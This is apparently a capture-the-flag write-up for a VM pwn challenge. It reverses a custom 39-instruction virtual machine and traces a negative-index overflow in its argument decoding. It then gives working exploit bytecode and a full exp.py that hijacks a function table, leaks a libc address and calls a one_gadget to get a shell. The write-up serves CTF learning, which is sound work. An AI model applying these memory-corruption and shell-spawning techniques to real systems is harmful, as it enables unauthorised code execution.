---
date: 2024-04-15 08:18
challenge: mixtpeailbc
tags:
  - VM pwn
---

It's a somewhat cumbersome virtual machine with 39 instructions, including memory operations, calculations, and output. However, I've encountered many cumbersome VM PWNs in domestic competitions, so settling down to reverse-engineer it felt manageable.

#### Analysis

At the very beginning, I noticed the output function by searching the references of `putchar`, then I decided to reverse the VM instruction's structure from that output function. However, after sending a `p32(0xdeadbeef)` I noticed my offset became negative. After debugging in gdb, I identified that this function has a negative overflow issue:

```c
__int64 __fastcall get_p16_arg(__int64 a1, unsigned int a2)
{
  unsigned __int8 middle_byte; // [rsp+1Eh] [rbp-2h]

  middle_byte = get_HIWORD(a2);
  return *(_QWORD *)(a1 + 8 * (middle_byte + 0x26LL) + 8) + (char)get_HIBYTE(a2);
}
```

However, there is an overflow check after the output function. I further searched for other cross-references to the `get_p16_arg` function and then got this one, which leads to control-flow-hijacking:

```c
void __fastcall sub_1850(__int64 a1, unsigned int a2)
{
  unsigned __int64 i; // [rsp+18h] [rbp-158h]
  unsigned __int64 j; // [rsp+20h] [rbp-150h]
  __int64 v4; // [rsp+28h] [rbp-148h]
  __int64 v5[39]; // [rsp+30h] [rbp-140h]
  unsigned __int64 v6; // [rsp+168h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v4 = get_p16_arg(a1, a2) + 0x930 + a1 + 8;
  for ( i = 0LL; i <= 0x26; ++i )
    v5[i] = *(_QWORD *)(a1 + 8 * i);
  for ( j = 0LL; j <= 0x26; ++j )
    *(_QWORD *)(a1 + 8 * j) = v5[*(unsigned __int8 *)(v4 + j)];
  next_i(a1);
}
```

After reviewing all the functionalities, I confirmed that each instruction in the VM is 4 bytes. The first two bytes often seem to be used for memory addressing, and the third byte usually serves as the primary argument.

#### Exploitation

At the start of the exploitation, I attempted to write a payload that could hijack the control flow to `0xcafebad0deadbeef` to validate the correctness of the above analysis:

```python
# 0x7fffffffd498 —▸ 0x7ffff7df9083 (__libc_start_main+243)

# -2532 = 0xfffffffffffff6d0
# target= 0xfffffffffffff810 (0x148)

bytecode = flat(
    [
        # write 0xfffffffffffff810
        0xF810F906,
        0xFFFFF907,
        0xFFFFF908,
        0xFFFFF909,
        # write 0xdeadbeef
        0xBEEF0106,
        0xDEAD0107,
        0xBAD00108,
        0xCAFE0109,
        # write 0x26
        0x015C0206,
        0x03020207,
        0x05040208,
        0x07060209,
        0x09080306,
        0x0B0A0307,
        0x0D0C0308,
        0x0F0E0309,
        0x11100406,
        0x13120407,
        0x15140408,
        0x17160409,
        0x19180506,
        0x1B1A0507,
        0x1D1C0508,
        0x1F1E0509,
        0x21200606,
        0x23220607,
        0x25240608,
        0x27260609,
        # trigger vuln
        0x00F9FF03,
        0x00000000,
    ],
    word_size=32,
)
```

The analysis proved to be very accurate, as I successfully hijacked the function table entries and controlled several parameters to be zero. Therefore, my plan was to invoke `one_gadget` to achieve `get_shell`.

But how to obtain the libc address? This puzzled me for a long time, until I finally realized that the memory copying functionality was intended for acquiring addresses:

```c
unsigned __int64 __fastcall sub_1966(__int64 a1, unsigned int a2)
{
  unsigned __int8 v3; // [rsp+17h] [rbp-829h]
  unsigned __int64 i; // [rsp+18h] [rbp-828h]
  unsigned __int64 j; // [rsp+20h] [rbp-820h]
  __int64 v6; // [rsp+28h] [rbp-818h]
  __int64 v7[257]; // [rsp+30h] [rbp-810h]
  unsigned __int64 v8; // [rsp+838h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  v3 = get_last8_arg(a2);
  v6 = get_p16_arg(a1, a2) + 0x930 + a1 + 8;
  for ( i = 0LL; i <= 0xFF; ++i )
    v7[i] = *(_QWORD *)(a1 + 8 * (i + 38) + 8);
  for ( j = 0LL; j < v3; ++j )
    *(_QWORD *)(a1 + 8 * (j + 38) + 8) = v7[*(unsigned __int8 *)(v6 + j)];
  next_i(a1);
  return __readfsqword(0x28u) ^ v8;
}
```

By exploiting an out-of-bounds condition, it's possible to treat a piece of data on the stack as an array index. I identified `__libc_start_main+243` because its last byte is fixed. To prevent errors, I pre-set the value corresponding to 0x83 to be the VM's PC pointer.

#### Final exp.py

After that, I performed some calculations to get `one_gadget` in VM memory and realized `get_shell`:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

# 0x7fffffffd498 —▸ 0x7ffff7df9083 (__libc_start_main+243)

# -2532 = 0xfffffffffffff6d0
# target= 0xfffffffffffff810 (0x148)

bytecode_list = []

for i in range(1, 0xFF + 1):
    bytecode_list += [((i << 16) | (i << 8) | 0x06)]

bytecode_list[0] = 0x00830106
bytecode_list[0x83] = 0x04008306

bytecode = flat(
    bytecode_list,
    word_size=32,
)

bytecode += flat(
    [
        0x8010FA06,
        0x00FA0804,
        # calcu libc_base
        0x28050526,
        0x20040426,
        0x18030326,
        0x10020226,
        0x08010126,
        0x83010114,
        0x02010113,
        0x03010113,
        0x04010113,
        0x05010113,
        # calcu onegadget
        0xFA7E0206,
        0x000B0306,
        0x10030326,
        0x03020213,
        0x02010113,
        # write 0xfffffffffffff810
        0xF810F906,
        0xFFFFF907,
        0xFFFFF908,
        0xFFFFF909,
        # write
        # 0xBEEF0106,
        # 0xDEAD0107,
        # 0xBAD00108,
        # 0xCAFE0109,
        # write 0x26
        0x015C0206,
        0x03020207,
        0x05040208,
        0x07060209,
        0x09080306,
        0x0B0A0307,
        0x0D0C0308,
        0x0F0E0309,
        0x11100406,
        0x13120407,
        0x15140408,
        0x17160409,
        0x19180506,
        0x1B1A0507,
        0x1D1C0508,
        0x1F1E0509,
        0x21200606,
        0x23220607,
        0x25240608,
        0x27260609,
        # trigger vuln
        0x00F9FF03,
        0x00000000,
    ],
    word_size=32,
)

open("aaa.bin", "wb").write(bytecode)
print(len(bytecode))
```
